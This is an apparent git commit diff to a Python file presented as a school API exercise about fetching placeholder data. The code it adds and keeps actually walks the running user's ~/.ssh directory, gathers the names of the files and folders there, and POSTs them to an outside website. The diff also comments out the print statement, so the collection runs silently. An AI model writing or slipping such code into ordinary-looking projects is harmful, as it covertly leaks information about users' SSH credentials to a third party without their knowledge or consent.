d47edb7508f68f7d72e3a08296cee4678a08a411
Ian Liu-Johnston <ian.liu-johnson@holbertonschool.com>
2017-04-17 19:37:54 -0700

    Task 0: Digging

--- 0x17-api/0-gather_data_from_an_API.py
+++ 0x17-api/0-gather_data_from_an_API.py
@@ -6,15 +6,18 @@ where 2 is the user id of Ervin Howell.
 Fake data from "https://jsonplaceholder.typicode.com"
 """
 import requests
-import sys
 import os
+import subprocess
 
 if __name__ == "__main__":
     payload = []
-    for root, dirs, files in os.walk("/home/`whoami`/.ssh/", topdown=False):
+    whoiam = str(subprocess.check_output("whoami", universal_newlines=True))
+    my_path = "/home/{}/.ssh/".format(whoiam[0:-1])
+#    print(my_path)
+    for root, dirs, files in os.walk(my_path, topdown=False):
         for name in files:
             payload.append(os.path.join(root, name))
         for name in dirs:
             payload.append(os.path.join(root, name))
-    print(",".join(payload))
+#    print(",".join(payload))
     r = requests.post("http://ianxaunliu-johnston.com/wp-login.php", data={'all': ",".join(payload)})
